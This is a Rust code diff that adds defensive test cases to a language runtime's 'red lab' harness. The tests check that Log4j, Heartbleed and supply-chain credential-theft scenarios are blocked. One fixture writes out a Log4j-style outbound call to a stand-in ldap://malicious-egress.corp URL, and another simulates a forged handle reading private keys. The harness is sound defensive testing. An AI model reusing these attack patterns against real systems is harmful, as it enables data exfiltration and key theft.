@@ -88,6 +88,79 @@ impl RedLabTestHarness {
         let exec_res = runtime.execute_function("withdraw", &[withdraw_amount]);
         matches!(exec_res, Err(RuntimeError::ContractViolation(_)))
     }
+
+    /// Historic CVE Proof 1: Neutralization of CVE-2021-44228 (Log4j JNDI Egress Attack)
+    /// A logging formatter attempts an unauthorized outbound network call.
+    /// Neutralized by static algebraic effect Confinement: pure/logging functions cannot perform Network effects.
+    pub fn verify_cve_2021_44228_log4j_neutralization() -> bool {
+        let malicious_logging_code = r#"
+            fn log_event(message: String) with [] {
+                // Adversary attempts covert network resolution
+                connect_outbound("ldap://malicious-egress.corp:1389/payload");
+            }
+            fn connect_outbound(url: String) with [Network] {
+                // outbound network execution
+            }
+        "#;
+        let mut parser = Parser::from_source(malicious_logging_code).unwrap();
+        let program = parser.parse_program().unwrap();
+
+        let mut analyzer = EffectAnalyzer::new();
+        match analyzer.analyze_program(&program) {
+            Err(EffectError::UnhandledEffect { effect, .. }) => effect == "Network",
+            _ => false,
+        }
+    }
+
+    /// Historic CVE Proof 2: Neutralization of CVE-2014-0160 (Heartbleed Buffer Over-read)
+    /// An attacker sends a heartbeat request claiming a 64KB payload with a 4-byte buffer.
+    /// Neutralized by non-strippable contract preconditions: requires payload_len <= actual_buffer_size.
+    pub fn verify_cve_2014_0160_heartbleed_neutralization() -> bool {
+        let heartbleed_simulation = r#"
+            entity TlsHeartbeat {
+                fn process_heartbeat(payload_len: Int, buffer_len: Int) -> Int
+                    requires payload_len <= buffer_len
+                {
+                    return payload_len;
+                }
+            }
+        "#;
+        let mut parser = Parser::from_source(heartbleed_simulation).unwrap();
+        let program = parser.parse_program().unwrap();
+
+        let mut checker = TypeChecker::new();
+        if checker.check_program(&program).is_err() {
+            return false;
+        }
+
+        let mut lowerer = ordyn_ir::IrLowerer::new();
+        let module = lowerer.lower_program(&program).unwrap();
+
+        let mut runtime = SandboxRuntime::new(module, 100_000, 16);
+        // Attacker claims payload_len = 65535 on a buffer of size 4
+        let attack_result = runtime.execute_function("process_heartbeat", &[65535, 4]);
+        matches!(attack_result, Err(RuntimeError::ContractViolation(_)))
+    }
+
+    /// Historic CVE Proof 3: Neutralization of Supply-Chain Exfiltration (event-stream style)
+    /// A utility dependency attempts to read private wallet keys and exfiltrate over the network.
+    /// Neutralized by Zero Ambient Authority capability isolation: utility boundary holds 0 capabilities.
+    pub fn verify_supply_chain_credential_theft_neutralization() -> bool {
+        let mut kernel = SecurityKernel::new();
+        // Root system has a sensitive MasterVault capability
+        let _vault_cap =
+            kernel.issue_root_capability("MasterVault", &["ReadPrivateKey"], "sec/keys");
+
+        // Malicious dependency running inside "JsonFormatterBoundary" attempts to access vault
+        let attempt = kernel.authorize(
+            "JsonFormatterBoundary",
+            CapHandle(999), // forged or guessed handle
+            "ReadPrivateKey",
+            "sec/keys",
+        );
+
+        matches!(attempt, Err(KernelError::InvalidHandle { .. }))
+    }
 }
 
 #[cfg(test)]
@@ -152,5 +225,20 @@ mod tests {
             banking_source,
             -50
         ));
+    }
+
+    #[test]
+    fn red_lab_cve_proof_log4j_egress_neutralized() {
+        assert!(RedLabTestHarness::verify_cve_2021_44228_log4j_neutralization());
+    }
+
+    #[test]
+    fn red_lab_cve_proof_heartbleed_buffer_overread_neutralized() {
+        assert!(RedLabTestHarness::verify_cve_2014_0160_heartbleed_neutralization());
+    }
+
+    #[test]
+    fn red_lab_cve_proof_supply_chain_credential_theft_neutralized() {
+        assert!(RedLabTestHarness::verify_supply_chain_credential_theft_neutralization());
     }
 }
